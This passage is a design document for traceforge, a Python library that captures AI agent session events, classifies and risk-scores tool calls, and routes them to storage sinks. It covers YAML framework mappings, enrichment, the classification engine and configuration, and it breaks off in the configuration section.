# traceforge

*Agent event observation pipeline with pluggable storage backends.*

Forges raw agent traces into structured, classified, risk-scored output.

---

## §1 — What It Is

A standalone Python library that **observes AI agent sessions** across any framework and routes structured events to pluggable storage backends. It is the observation-to-storage pipeline — the plumbing layer between "agent did something" and "that knowledge lives somewhere useful."

traceforge is framework-agnostic. Adding support for a new agent framework requires only a YAML mapping file — no Python code. It ships with 15 bundled mappings covering the most common agent frameworks and supports arbitrary extensions via user-defined mappings.

The library handles the full data lifecycle:
1. **Sources** transport raw data from files, HTTP endpoints, SSE streams, SQLite databases, or replays
2. **Parsers** pre-process non-structured formats (markdown logs, chunked data) into structured dicts
3. **Adapters** parse raw input into a common `SessionEvent` type using declarative YAML mappings
4. **Enricher** adds metadata: tool pairing, duration computation, multi-dimensional classification, risk scoring, phase detection, visibility assignment
5. **Pipeline** routes enriched events to one or more storage sinks with error isolation
6. **Sinks** write to storage backends or call custom handlers

Known consumers:
- **CodePlane** routes events to SQLite + OTEL for its control plane UI
- **memrelay** routes events to Graphiti for persistent agent memory
- A hypothetical third project might route to PostgreSQL, Elasticsearch, Langfuse, or a custom analytics pipeline

### Extraction Lineage

traceforge was extracted from CodePlane as a standalone library. CodePlane's observation logic was tightly coupled to its UI; traceforge decouples the pipeline so any consumer can subscribe to agent events without importing CodePlane's domain concerns.

---

## §2 — Architecture

`
┌────────────────────────────────────────────────────────────────────────┐
│                         SOURCES (Transport)                             │
│                                                                        │
│  FileWatchSource  FilePollSource  HttpPollSource  SSESource             │
│  SqliteSource     ReplaySource                                         │
│                                                                        │
│  Each source: transport → async stream of RawRecord                    │
└──────────────────────────────────┬─────────────────────────────────────┘
                                   │ RawRecord (payload: str)
                                   ▼
┌────────────────────────────────────────────────────────────────────────┐
│                  PARSERS (Optional Pre-processing)                      │
│                                                                        │
│  CopilotPreParser (markdown + log lines → event dicts)                 │
│  AiderPreParser   (markdown → event dicts)                             │
│                                                                        │
│  For frameworks that don't emit JSONL natively                         │
└──────────────────────────────────┬─────────────────────────────────────┘
                                   │ dict (normalized event)
                                   ▼
┌────────────────────────────────────────────────────────────────────────┐
│                    ADAPTERS (Parsing → SessionEvent)                    │
│                                                                        │
│  MappedJsonAdapter (YAML-driven, 15 frameworks)                        │
│  OtelSpanAdapter   (MAF OTel spans → SessionEvent)                     │
│                                                                        │
│  Preprocessors normalize complex event shapes before YAML mapping      │
└──────────────────────────────────┬─────────────────────────────────────┘
                                   │ SessionEvent
                                   ▼
┌────────────────────────────────────────────────────────────────────────┐
│                      EVENT PIPELINE                                     │
│                                                                        │
│  ┌──────────────────────────────────────────────────────────────────┐  │
│  │                        ENRICHER                                   │  │
│  │                                                                   │  │
│  │  • Tool call pairing (start ↔ complete)                          │  │
│  │  • Duration computation                                           │  │
│  │  • Multi-dimensional classification (mechanism/effect/scope/      │  │
│  │    role/action/capability/structure)                               │  │
│  │  • Shell AST analysis (bash, PowerShell, cmd)                    │  │
│  │  • MCP profile matching                                           │  │
│  │  • Risk scoring (0-100 with MITRE ATT&CK mappings)               │  │
│  │  • Phase detection (planning/implementation/verification/         │  │
│  │    exploration/review)                                            │  │
│  │  • Visibility assignment (visible/system/collapsed)               │  │
│  └──────────────────────────────────────────────────────────────────┘  │
│                                                                        │
│  Error-isolated fan-out to all registered sinks                        │
└──────────────────────────────────┬─────────────────────────────────────┘
                                   │ Enriched SessionEvent
                                   ▼
┌────────────────────────────────────────────────────────────────────────┐
│                       STORAGE SINKS                                     │
│                                                                        │
│  CallbackSink (user-provided async functions)                          │
│  SqliteSink     JsonlSink     S3Sink     OtelSink     WebhookSink     │
│                                                                        │
│  Sinks implement: on_event(), on_span(), on_usage(), flush(), close()  │
└────────────────────────────────────────────────────────────────────────┘
`

### Data Flow Summary

`
Observation: Source → [Parser] → Adapter → Enricher → Pipeline (SessionMonitor) → Sink(s)
Gate:        Hook Payload → Adapter.parse_one() → Enricher.classify() → Shield (GatePolicy) → Verdict
                                    ↑ same classify/ rules ↑
`

The observation pipeline supports three record types flowing through sinks:
- `SessionEvent` — the primary event type (all enrichment applies here)
- `TelemetrySpan` — derived span data (start/end pairs)
- `UsageRecord` — LLM token/cost accounting

The gate path (§22) shares `classify/` and `mappings/` with the observation pipeline but operates synchronously on single events, returning a verdict instead of writing to sinks.

---

## §3 — Core Types

All domain objects inherit from `FrozenModel` (immutable Pydantic model). All configuration/schema objects inherit from `StrictModel` (rejects unknown fields).

### Base Models (`models.py`)

`python
class StrictModel(BaseModel):
    model_config = ConfigDict(extra="forbid")

class FrozenModel(BaseModel):
    model_config = ConfigDict(frozen=True)
`

### EventKind (`types.py`)

An **open string registry** class with 75+ `Final` constants. Grammar:

`
<domain>[.<object>].<phase>
`

Any string is a valid `kind` value (forward-compatible), but canonical kinds are defined as constants for autocomplete, documentation, and filtering.

**Domains:** session, turn, message, tool, llm, planning, reasoning, agent, file, command, mcp, hook, permission, input, checkpoint, memory, knowledge, browser, guardrail, skill, workflow, task, telemetry

**Phases:** started, completed, failed, chunk, progress, requested, received, granted, denied, created, restored, skipped

`python
class EventKind:
    SESSION_STARTED: Final = "session.started"
    TOOL_CALL_STARTED: Final = "tool.call.started"
    TOOL_CALL_COMPLETED: Final = "tool.call.completed"
    LLM_CALL_STARTED: Final = "llm.call.started"
    # ... 75+ constants total
    RAW: Final = "raw"  # catch-all for unmapped events

KNOWN_KINDS: frozenset[str]  # all canonical kinds for validation/filtering
`

### IngestionMode

`python
IngestionMode = Literal["stream", "file_watch", "poll", "replay", "sqlite"]
`

### EventMetadata

`python
class EventMetadata(FrozenModel):
    # Source provenance
    source_framework: str | None        # "copilot", "claude", "aider", etc.
    ingestion_mode: IngestionMode | None
    raw_kind: str | None                # original framework-specific event type

    # Correlation
    span_id: str | None
    parent_id: str | None
    correlation_id: str | None
    run_id: str | None

    # Ordering
    sequence: int | None
    namespace: tuple[str, ...] | None   # scope path (subgraph, subagent)
    partial: bool = False               # True for streaming chunks

    # Enrichment (set by Enricher)
    repo: str | None
    turn_id: str | None
    visibility: Visibility = Visibility.VISIBLE
    phases: frozenset[Phase] | None
    classification: Classification | None
    tool_display: str | None
    motivation: ToolMotivation | None
    duration_ms: float | None
`

### SessionEvent

`python
class SessionEvent(FrozenModel):
    id: str                              # UUID4, auto-generated
    kind: str                            # open string (use EventKind constants)
    session_id: str
    timestamp: datetime
    payload: dict[str, Any]
    raw_event: dict[str, Any] | None     # original event data, verbatim
    metadata: EventMetadata
`

### TelemetrySpan

`python
class TelemetrySpan(FrozenModel):
    name: str
    session_id: str
    start_time: datetime
    end_time: datetime
    attributes: dict[str, Any]
`

### UsageRecord

`python
class UsageRecord(FrozenModel):
    session_id: str
    timestamp: datetime
    model: str
    input_tokens: int       # >= 0
    output_tokens: int      # >= 0
    cost_usd: float | None  # >= 0
`

---

## §4 — Sources

The async transport layer. Each source implements the `Source` ABC: an async context manager that yields `RawRecord` objects via `__aiter__`.

### Source ABC (`sources/base.py`)

`python
@dataclass(slots=True)
class RawRecord:
    payload: str
    source_name: str
    mode: IngestionMode
    sequence: int | None = None
    received_at: datetime = field(default_factory=lambda: datetime.now(timezone.utc))

class Source(ABC):
    name: str
    async def __aenter__(self) -> "Source": ...
    async def __aexit__(self, ...): ...
    def __aiter__(self) -> AsyncIterator[RawRecord]: ...
`

### Implementations

| Source | Mode | Description |
|--------|------|-------------|
| `FileWatchSource` | `file_watch` | OS-native events via watchdog. Handles rotation, truncation, creation. |
| `FilePollSource` | `poll` | Fixed-interval polling. For network mounts where inotify is unavailable. |
| `HttpPollSource` | `poll` | HTTP polling with ETag/Last-Modified conditional requests. Retry with exponential backoff. Cursor-based pagination. |
| `SSESource` | `stream` | WHATWG-compliant Server-Sent Events. Reconnect with backoff, Last-Event-ID. |
| `SqliteSource` | `sqlite` | Poll a SQLite table for new rows via monotonic cursor column. WAL mode for concurrent reads. |
| `ReplaySource` | `replay` | One-shot file read, line-by-line. For testing and batch reprocessing. |

All sources:
- Are single-consumer (no concurrent iteration)
- Detect file rotation/truncation where applicable
- Run I/O in background threads to avoid blocking the event loop
- Validate resources on `__aenter__`

---

## §5 — Adapters

Adapters parse raw bytes/strings into `SessionEvent` streams.

### Adapter ABC (`adapters/base.py`)

`python
class Adapter(ABC):
    def parse(self, raw: bytes | str) -> Iterator[SessionEvent]: ...

class JsonLineAdapter(Adapter):
    """Handles bytes→str, JSON parsing, dict validation."""
    def parse_dict(self, obj: dict[str, Any]) -> Iterator[SessionEvent]: ...
`

### MappedJsonAdapter (`adapters/mapped_json.py`)

The primary adapter — data-driven via YAML mappings. No custom Python code needed per framework.

`python
class MappedJsonAdapter(JsonLineAdapter):
    def __init__(self, mapping: FrameworkMapping, session_id: str): ...
    def parse_dict(self, obj: dict) -> Iterator[SessionEvent]: ...

    @classmethod
    def from_yaml(cls, yaml_path: str, session_id: str) -> "MappedJsonAdapter": ...
`

Features:
- Dot-path field extraction (`foo.bar.0.baz`)
- Literal values (`literal:some_value`)
- Timestamp heuristic parsing (ISO, unix seconds, milliseconds, nanoseconds)
- Preprocessor dispatch for non-flat event schemas
- Default kind for unmapped event types

### OtelSpanAdapter (`adapters/otel.py`)

For Microsoft 365 Agents SDK (MAF) which emits OTel spans instead of JSON lines.

`python
class OtelSpanAdapter(Adapter):
    def __init__(self, ingestion_mode: IngestionMode, session_id: str): ...
    def parse_span(self, span: dict[str, Any]) -> Iterator[SessionEvent]: ...
    def parse(self, raw: str) -> Iterator[SessionEvent]: ...
`

Features:
- Both snake_case and camelCase OTel JSON keys
- Duration computation from start/end nanoseconds
- Attribute extraction via YAML-configured rules (`maf.yaml`)
- Status code → error kind mapping

> **Note:** MAF OTel spans carry only structural metadata (timing, routing, counts) — not
> message content. For full activity text (needed for motivation tracking and content
> analysis), use the `maf_transcript` mapping with `MappedJsonAdapter`, which reads JSONL
> output from the SDK's `TranscriptLoggerMiddleware` (`FileTranscriptStore`). The two
> adapters are complementary: OTel gives timing/structure, transcript gives content.
>
> To enable transcript output in a MAF app:
> ```python
> from microsoft_agents.hosting.core.storage import (
>     TranscriptLoggerMiddleware, FileTranscriptStore,
> )
> ADAPTER.use(TranscriptLoggerMiddleware(FileTranscriptStore("./transcripts")))
> ```

---

## §6 — YAML Mapping System

The declarative configuration format that drives `MappedJsonAdapter`.

### Schema (`FrameworkMapping`)

`yaml
framework: copilot               # framework identifier
framework_version: "1.x"        # format version this mapping targets
ingestion_mode: file_watch       # must be explicit
type_field: type                 # dot-path to event type discriminator
timestamp_field: timestamp       # dot-path to timestamp
default_kind: raw                # kind for unmapped event types
preprocessor: claude             # optional: registered preprocessor name

# Motivation tracking (optional)
motivation:
  sources:
    - events: ["assistant.message", "assistant.intent"]
      field: content
      role: intent
    - events: ["assistant.reasoning"]
      field: content
      role: reasoning
  targets: ["tool.call.started", "tool.call.completed"]
  source_window: 10

events:
  session.start:                 # raw event type value
    kind: session.started        # canonical EventKind
    payload:                     # field_name → dot-path extraction
      model: data.selectedModel
      cwd: data.context.cwd
`

### Motivation Tracking

Tool call events gain context by tracking assistant messages — the "motivation"
for why a tool was invoked. This is configured declaratively per-framework via
the `motivation:` block in YAML.

**ToolMotivation type (on EventMetadata):**

```python
class ToolMotivation(FrozenModel):
    intent: str | None = None           # latest plan/statement
    reasoning: str | None = None        # latest CoT/thinking text
    source_event_ids: tuple[str, ...]   # rolling window of motivation event IDs
```

**MotivationConfig fields:**

| Field | Type | Default | Purpose |
|-------|------|---------|---------|
| `sources` | `list[MotivationSource]` | `[]` | Which events carry motivation and what role they fill |
| `targets` | `list[str]` | `["tool.call.started", "tool.call.completed"]` | Which event kinds receive the `ToolMotivation` |
| `source_window` | `int` | `10` | Max `source_event_ids` to retain (rolling window) |

**MotivationSource fields:**

| Field | Type | Default | Purpose |
|-------|------|---------|---------|
| `events` | `list[str]` | — | Raw event type keys that carry this motivation |
| `field` | `str` | `"content"` | Payload field (after mapping) containing the text |
| `role` | `"intent" \| "reasoning"` | `"intent"` | Which slot this fills |

**Behavior in `MappedJsonAdapter._map_single()`:**

1. When a raw event's type matches a source's `events` list, the adapter extracts
   text from the mapped `field` and stores it in the corresponding role slot
2. Each motivation event's ID is appended to `_source_event_ids` (once per event, not per role)
3. When a target event is produced and at least one slot (intent or reasoning) is non-None,
   a `ToolMotivation` is attached to `metadata.motivation`
4. If both slots are None (empty/cleared), `metadata.motivation` is `None`
5. The `source_event_ids` list enforces a rolling window — oldest IDs are dropped

**Example flow (Claude):**
```
assistant.thinking → "I should check the config"    → reasoning = "I should check the config"
assistant.text     → "Let me read the config file"  → intent = "Let me read the config file"
tool.call.started  → motivation = ToolMotivation(
                       intent="Let me read the config file",
                       reasoning="I should check the config",
                       source_event_ids=("ev-1", "ev-2"))
```

**Framework coverage:**

| Framework | Intent sources | Reasoning sources | Custom targets |
|-----------|---------------|-------------------|----------------|
| Claude Code | `assistant.text` | `assistant.thinking` | — |
| GitHub Copilot | `assistant.message`, `assistant.intent` | `assistant.reasoning` | — |
| Cline | `say.text` | `say.reasoning` | `tool.call.completed` |
| Goose | `assistant` | `thinking` | — |
| CrewAI | `llm_call_completed` | `llm_thinking_chunk`, `agent_reasoning_completed` | — |
| OpenCode | `session.next.text.ended` | `session.next.reasoning.ended` | — |
| Codex | `message.assistant` | — | — |
| Continue | `assistant.message` | — | — |
| Amazon Q | `message.assistant` | — | — |
| PydanticAI | `model_text_response` | — | — |
| smolagents | `ActionStep` | — | `tool.call.started` |
| SWE-agent | `assistant` | — | `tool.output` |
| MAF (transcript) | `message.bot` | — | `tool.call.started` |
| Aider (markdown) | `assistant_message` | — | `tool.call.completed` |
| Copilot (markdown) | `assistant_text`, `api_assistant_text` | — | — |
| Aider (analytics) | *(none — no text)* | — | — |
| MAF (OTel) | *(none — spans lack content)* | — | — |
| LangGraph | *(none — no assistant events)* | — | — |

### Bundled Mappings (22 files in `src/traceforge/mappings/`)

| File | Framework | Notes |
|------|-----------|-------|
| `copilot.yaml` | GitHub Copilot CLI | JSONL session events |
| `copilot_markdown.yaml` | Copilot CLI | For CopilotPreParser output |
| `copilot_vscode.yaml` | Copilot (VS Code) | Uses `copilot_vscode` preprocessor |
| `claude.yaml` | Claude Code (Anthropic) | Uses `claude` preprocessor |
| `cline.yaml` | Cline (VS Code) | Uses `cline` preprocessor |
| `aider.yaml` | Aider | JSONL mode |
| `aider_markdown.yaml` | Aider | For AiderPreParser output |
| `amazonq.yaml` | Amazon Q Developer | Uses `amazonq` preprocessor |
| `antigravity.yaml` | Google Antigravity | Uses `antigravity` preprocessor |
| `codex.yaml` | OpenAI Codex CLI | Uses `codex` preprocessor |
| `continue_dev.yaml` | Continue.dev | Uses `continue_dev` preprocessor |
| `crewai.yaml` | CrewAI | Multi-agent framework |
| `goose.yaml` | Goose (Block) | Uses `goose` preprocessor |
| `langgraph.yaml` | LangGraph | LangChain orchestration |
| `maf.yaml` | Microsoft 365 Agents SDK | OTel span mapping (used by OtelSpanAdapter) |
| `maf_transcript.yaml` | Microsoft 365 Agents SDK | Transcript JSONL (FileTranscriptStore output) |
| `openai_agents.yaml` | OpenAI Agents SDK | Uses `openai_agents` preprocessor |
| `opencode.yaml` | OpenCode | CLI coding agent |
| `openhands.yaml` | OpenHands (All-Hands AI) | Uses `openhands` preprocessor |
| `pydantic_ai.yaml` | PydanticAI | Uses `pydantic_ai` preprocessor |
| `smolagents.yaml` | SmoLAgents (HuggingFace) | Uses `smolagents` preprocessor |
| `sweagent.yaml` | SWE-Agent (Princeton) | SWE-bench agent |

### Mapping Resolution (`config/mappings.py`)

Search order (first match wins):
1. User-specified dirs (from `config.mappings_dirs`)
2. `~/.traceforge/mappings/` (default user dir)
3. Bundled mappings (`src/traceforge/mappings/`)

User mappings override bundled ones with the same name.

---

## §7 — Preprocessors

Preprocessors normalize raw dicts into flat dicts suitable for type_field-based YAML mapping. They handle compound discriminators, nested structures, and field-presence-based typing.

### Registry Pattern (`preprocessors/registry.py`)

`python
PreprocessorFn = Callable[[dict[str, Any]], list[dict[str, Any]]]

@register_preprocessor("claude")
def preprocess_claude(obj: dict) -> list[dict]: ...
`

### Registered Preprocessors (14)

| Name | Module | Framework | Purpose |
|------|--------|-----------|---------|
| `claude` | `preprocessors/claude.py` | Claude Code | Normalizes nested content blocks |
| `cline` | `preprocessors/cline.py` | Cline | Handles VS Code extension format |
| `goose` | `preprocessors/goose.py` | Goose | Normalizes Block's event shape |
| `openhands` | `preprocessors/openhands.py` | OpenHands | Handles action/observation dicts |
| `pydantic_ai` | `preprocessors/pydantic_ai.py` | PydanticAI | Normalizes streaming parts |
| `smolagents` | `preprocessors/smolagents.py` | SmoLAgents | Handles HuggingFace format |
| `amazonq` | `preprocessors/amazonq.py` | Amazon Q | Expands history[] user/assistant pairs |
| `antigravity` | `preprocessors/antigravity.py` | Google Antigravity | Normalizes SDK capture |
| `codex` | `preprocessors/codex.py` | OpenAI Codex | Flattens double-type rollout nesting |
| `continue_dev` | `preprocessors/continue_dev.py` | Continue.dev | Maps camelCase tool fields |
| `copilot_vscode` | `preprocessors/copilot_vscode.py` | Copilot (VS Code) | Journal mapping |
| `maf_transcript` | `preprocessors/maf_transcript.py` | M365 Agents | Transcript JSONL |
| `openai_agents` | `preprocessors/openai_agents.py` | OpenAI Agents SDK | Normalizes agent events |
| `opencode` | `preprocessors/opencode.py` | OpenCode | Normalizes session.next.* |

Each preprocessor:
- Takes a single raw dict
- Returns a list of flat dicts (one input may expand to multiple events)
- Is referenced by name in the YAML mapping's `preprocessor` field

---

## §8 — Parsers

Custom pre-parsers for frameworks that don't emit JSONL natively. These convert unstructured formats (markdown, log files) into structured event dicts that can then flow through `MappedJsonAdapter`.

### Base Class (`parsers/base.py`)

`python
class MarkdownPreParser(ABC):
    """Tree-sitter markdown AST parser with incremental support."""

    def parse_file(self, path: Path) -> Iterator[dict[str, Any]]: ...
    def parse_text(self, text: str) -> Iterator[dict[str, Any]]: ...
    def parse_chunk(self, chunk: str) -> Iterator[dict[str, Any]]: ...
    def flush(self) -> Iterator[dict[str, Any]]: ...
`

Features:
- Full-file and incremental (chunked) parsing modes
- Hold-back of final event until next chunk confirms structural closure
- Block extraction via tree-sitter queries
- Sorted-by-position processing

### CopilotPreParser (`parsers/copilot.py`)

Handles two Copilot CLI data sources:
1. **Markdown parsing** (`parse_turn`): Extracts tool calls and structured blocks from `session-store.db` assistant_response text
2. **Log line parsing** (`parse_log_line`): Extracts structured API events from `process-*.log` files

Emits events suitable for `copilot_markdown.yaml` mapping.

### AiderPreParser (`parsers/aider.py`)

Converts `.aider.chat.history.md` into structured event dicts:
- Session start detection from `# aider chat started at ...` headings
- User message / slash command extraction from `####` headings
- Tool output sub-classification (version, model, repo, usage, edits, commits, errors)
- SEARCH/REPLACE block extraction for file edits
- AI response content from paragraphs/setext headings

Emits events suitable for `aider_markdown.yaml` mapping.

---

## §9 — Enrichment

The `Enricher` (`enricher.py`) is a stateful per-session processor that sits inside the pipeline. It transforms raw events before they reach sinks.

The enricher produces **classifications and measurements only** — never verdicts, recommended actions, or decision-implying fields. It answers "what is this?" and "how risky is this?", not "what should be done about it?". Action semantics exist only in the gate module (§22) where they are actually executable.

### Enricher API

`python
class Enricher:
    def __init__(
        self,
        custom_classifications: dict[str, Classification] | None = None,
        config: ClassifyConfig | None = None,
        config_path: Path | str | None = None,
    ) -> None: ...

    def process(self, event: SessionEvent) -> SessionEvent | list[SessionEvent] | None: ...
    def flush(self) -> list[SessionEvent]: ...
`

### Enrichment Steps

1. **Tool call pairing**: Buffers `TOOL_CALL_STARTED` events, pairs them with matching `TOOL_CALL_COMPLETED` by `tool_call_id`. Merges payloads. Emits orphan starts on displacement or flush.

2. **Duration computation**: Calculates `metadata.duration_ms` from timestamp difference of start/complete pairs.

3. **Classification dispatch**: For `TOOL_CALL_STARTED` and unpaired `TOOL_CALL_COMPLETED`:
   - Shell tools → deep tree-sitter AST analysis (bash, PowerShell, cmd)
   - Native tools → static classification via engine lookup
   - MCP tools → profile-based classification
   - Scope refinement from file paths in payload

4. **Risk scoring**: Computes a 0-100 risk score:
   - Shell commands: structural + flag modifiers + injection patterns + pipeline taint + context
   - Native/MCP tools: intent base + scope + capability escalation + context

5. **Visibility assignment**: Sets `metadata.visibility` based on event kind (system events, bookkeeping → SYSTEM; similar repeated events → COLLAPSED).

6. **Phase detection**: Derives `metadata.phases` from classification dimensions.

### Return Semantics

- Returns `None` → event is buffered (waiting for pair)
- Returns `SessionEvent` → enriched event ready for sinks
- Returns `list[SessionEvent]` → displaced orphan + new buffer (rare)

---

## §10 — Classification Engine

A YAML-driven, multi-dimensional classification system for tool invocations. Located in the `classify/` package (14 modules + 9 data files).

### Dimensions (`classify/core.py`)

| Dimension | Question | Root Values |
|-----------|----------|-------------|
| `Mechanism` | What resource domain? | filesystem, process, network, database, delegation, communication, unknown |
| `Effect` | What state change? | read_only, mutating, destructive |
| `Scope` | What's being operated on? | artifact, state, data, configuration, knowledge, identity, message |
| `Role` | What archetype of tool? | validator, retriever, transformer, generator, modifier, executor, communicator, orchestrator, observer, persistence |
| `Action` | What verb? | validate, retrieve, transform, generate, execute, deliver, configure, analyze, persist, modify, remove |
| `Capability` | What permissions needed? | filesystem_read, filesystem_write, network_inbound, network_outbound, subprocess, uses_credentials, elevated_privilege, human_interaction |
| `Structure` | Composition pattern? | sequential, parallel, conditional, interactive |

### Coding Domain Extensions (`classify/coding.py`)

Dot-path subtypes that extend root dimensions for software engineering:

- `CodingMechanism`: process.shell, process.repl, process.debug, network.http, database.sql, delegation.agent, communication.user, etc.
- `CodingScope`: artifact.source_code, artifact.test_code, configuration.dependency, state.repository, etc.
- `CodingRole`: validator.linter, validator.test_runner, transformer.compiler, executor.script_runner, persistence.version_control, etc.
- `CodingAction`: validate.lint, validate.test, transform.compile, persist.commit, deliver.deploy, etc.
- `ShellDialect`: bash, powershell, cmd, zsh, fish, posix_sh
- `ShellStructure`: piped, redirected

### Classification Dataclass

`python
@dataclass(frozen=True)
class Classification:
    mechanism: str
    effect: str | None = None
    scope: frozenset[str] = frozenset()
    role: frozenset[str] = frozenset()
    action: frozenset[str] = frozenset()
    capability: frozenset[str] = frozenset()
    structure: frozenset[str] = frozenset()
    shell_dialect: str | None = None
    binaries: tuple[str, ...] = ()
    phase_map: tuple[PhaseSegment, ...] = ()
`

### Shell Classification (`classify/shell.py`, `classify/powershell.py`, `classify/cmd.py`)

Deep AST-based classification of shell commands:
- **Bash**: tree-sitter-bash parser. Handles compound commands, pipes, redirects, conditionals. Detects structural patterns.
- **PowerShell**: tree-sitter-powershell parser. Handles cmdlets and native commands.
- **cmd.exe**: Lightweight tokenization (no mature tree-sitter grammar). Splits on & and &&.

Shared infrastructure:
- Transparent wrapper unwrapping (env, sudo, nohup, etc.)
- Binary classification via rule tables
- Subcommand and flag analysis
- Activity detection (verification, delivery, setup, investigation, implementation)
- Per-command phase grouping into `phase_map`

### MCP Classification (`classify/mcp.py`)

Profile-based classification for MCP (Model Context Protocol) tools:

`python
@dataclass(frozen=True)
class McpServerProfile:
    namespace_aliases: tuple[str, ...]  # e.g., ("github", "gh")
    mechanism: str
    role: frozenset[str]
    default_effect: str | None
    scope: frozenset[str]
    action: frozenset[str]
    capability: frozenset[str]
    tool_overrides: dict[str, McpToolOverride]
`

Namespace extraction from `mcp__<server>__<tool>` naming convention.

### Risk Scoring (`classify/risk.py`)

Produces a 0-100 risk score with confidence level and MITRE ATT&CK technique mappings.

`python
@dataclass(frozen=True, slots=True)
class RiskAssessment:
    score: int        # 0-100
    level: str        # safe / caution / danger / critical
    confidence: str   # high / medium / low
    factors: tuple[str, ...]
    mitre: tuple[str, ...]
    version: str
`

Scoring layers:
1. **Structural**: Effect × scope (from Classification)
2. **Flag modifiers**: Per-binary flag rules (from `risk.yaml`)
3. **Injection patterns**: Regex-matched evasion/injection patterns (capped)
4. **Pipeline taint**: Source→sink flow escalation through pipe operators
5. **Context**: Project-relative path targeting adjustments

### ClassificationEngine (`classify/config.py`)

Immutable pre-built runtime indexes constructed once from config:

`python
class ClassificationEngine:
    canonical_tools: dict[str, str]
    tool_classifications: dict[str, Classification]
    verb_inference: dict[str, tuple[str, str]]
    shell_rules: tuple[Rule, ...]
    rules_by_binary: dict[str, tuple[Rule, ...]]
    binary_info: dict[str, BinaryInfo]
    mcp_profiles: tuple[McpServerProfile, ...]
    mcp_alias_index: dict[str, McpServerProfile]
    risk_config: dict[str, Any] | None
    # ... plus lookup tables for npm scripts, interpreter modules, git subcmds, etc.
`

### Classification Data Files (`classify/data/`)

| File | Content |
|------|---------|
| `canonical_tools.yaml` | Tool name aliases (many→one normalization) |
| `verb_inference.yaml` | Verb prefix → (effect, action) mappings |
| `binary_info.yaml` | Static metadata about known binaries (role, network, destructive) |
| `shell_defaults.yaml` | Activity→dimension default mappings |
| `shell_rules.yaml` | Declarative binary+subcmd+flag→classification rules |
| `effect_overrides.yaml` | Per-binary flag/subcmd effect override rules |
| `mcp_profiles.yaml` | MCP server classification profiles |
| `tool_classifications.yaml` | Full classifications for known native tools |
| `risk.yaml` | Risk scoring weights, flag modifiers, injection patterns, taint rules |
| `recommendation_rules.yaml` | Governance rule set → `RecommendedAction` (allow/warn/escalate/deny/transform), consumed by the `Assessor` (§22) |

### Workflow Dimensions (`classify/workflow.py`)

Derived/presentation concerns separate from semantic classification:

`python
class Phase(StrEnum):
    PLANNING, IMPLEMENTATION, VERIFICATION, EXPLORATION, REVIEW

class Visibility(StrEnum):
    VISIBLE, SYSTEM, COLLAPSED
`

### Dimension Registry (`classify/registry.py`)

Validates and queries hierarchical dot-path classification values:

`python
class DimensionRegistry:
    def register_dimension(self, name: str, enum_cls: type[StrEnum]) -> None: ...
    def extend_dimension(self, name: str, enum_cls: type[StrEnum]) -> None: ...
    def validate(self, dimension: str, value: str) -> bool: ...
    def children_of(self, dimension: str, ancestor: str) -> frozenset[str]: ...
    def is_descendant_of(self, dimension: str, value: str, ancestor: str) -> bool: ...
`

---

## §11 — Pipeline

`EventPipeline` (`pipeline.py`) routes events, spans, and usage records to multiple storage sinks with error isolation.

`python
class EventPipeline:
    def __init__(self, sinks: list[StorageSink], enricher: Enricher | None = None) -> None: ...

    async def push(self, event: SessionEvent) -> None: ...
    async def push_span(self, span: TelemetrySpan) -> None: ...
    async def push_usage(self, usage: UsageRecord) -> None: ...
    async def flush(self) -> None: ...
    async def close(self) -> None: ...
`

### Behavior

- **Enrichment**: If an enricher is configured, events pass through `enricher.process()` before reaching sinks. Enricher failures fall through gracefully (raw event passed to sinks).
- **Error isolation**: Each sink call is wrapped in `asyncio.gather(return_exceptions=True)`. One failing sink does not block others.
- **Fan-out**: All sinks receive every event concurrently.
- **Flush**: Drains enricher buffer (unpaired tool starts), then flushes all sinks.
- **Close**: Flush + close all sinks (also error-isolated).

---

## §12 — Storage Sinks

Sinks are the output layer. Users select and configure sinks entirely via YAML -- no code required. The `StorageSink` ABC exists for internal implementation; end users never subclass it.

### StorageSink ABC (`sinks/base.py`)

`python
class StorageSink(ABC):
    @abstractmethod
    async def on_event(self, event: SessionEvent) -> None: ...
    async def on_span(self, span: TelemetrySpan) -> None: ...   # default no-op
    async def on_usage(self, usage: UsageRecord) -> None: ...   # default no-op
    async def flush(self) -> None: ...                          # default no-op
    async def close(self) -> None: ...                          # default no-op
`

### Implementations

| Sink | Status | Description |
|------|--------|-------------|
| `CallbackSink` | ✅ Done | Delegates to user-provided async callables. For SDK/library consumers that embed traceforge in Python. |
| `SqliteSink` | ✅ Done | Local SQLite storage with WAL mode, schema migration, batch inserts. Configured via `type: sqlite` in YAML. |
| `JsonlSink` | ✅ Done | Append-only JSONL files with optional size-based rotation. Configured via `type: jsonl` in YAML. |
| `S3Sink` | ✅ Done | Cloud object storage with buffered upload and key formatting. Configured via `type: s3` in YAML. Requires `boto3` (optional dep). |
| `ParquetSink` | ✅ Done | One columnar Parquet file per session for analytics consumers. SDK/programmatic only (no YAML `type:` yet); requires `pyarrow` (optional dep). |
| `OtelExporterSink` | ✅ Done | Export events / spans / usage as OTLP/HTTP JSON to an OpenTelemetry collector. Configured via `type: otel` in YAML. |
| `ConsoleSink` | ✅ Done | Pretty-print governance results to terminal. Configured via `type: console` in YAML. |
| `WebhookSink` | ✅ Done | POST governance results to a webhook URL. Configured via `type: webhook` in YAML. |

### Configuration examples

`yaml
sinks:
  - type: sqlite
    path: ./events.db
  - type: jsonl
    path: ./output/events.jsonl
    rotate_mb: 100
  - type: s3
    bucket: my-traces
    prefix: agents/
    region: us-east-1
`

---

## §13 — Configuration

### Root Config (`config/models.py`)

`python
class TraceforgeConfig(StrictModel):
    log_level: Literal["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"] = "INFO"
    mappings_dirs: list[Path] = []           # additional mapping search paths
    pipelines: list[PipelineConfig] = []     # named source→adapter→sinks pipelines
    sdk: SDKConfig = SDKConfig()             # in-process push mode settings

class SDKConfig(StrictModel):
    batch_size: int = 64
    flush_interval: float = 5.0
    max_queue_size: int = 10000
`

### PipelineConfig

`python
class PipelineConfig(StrictModel):
    name: str                    # unique pipeline identifier
    source: SourceConfig         # discriminated union
    adapter: AdapterConfig       # discriminated union
    sinks: list[SinkConfig]      # at least one sink required
`

### Discriminated Unions

**Sources** (discriminator: `type`):
`FileWatchSourceConfig`, `FilePollSourceConfig`, `HttpPollSourceConfig`, `SSESourceConfig`, `ReplaySourceConfig`

> Note: `SqliteSource` is implemented but not yet exposed in the config union. It is used programmatically (e.g., by CopilotPreParser) rather than instantiated from `traceforge.yaml`.

**Adapters** (discriminator: `type`):
`MappedJsonAdapterConfig`, `OtelSpanAdapterConfig`

**Sinks** (discriminator: `type`):
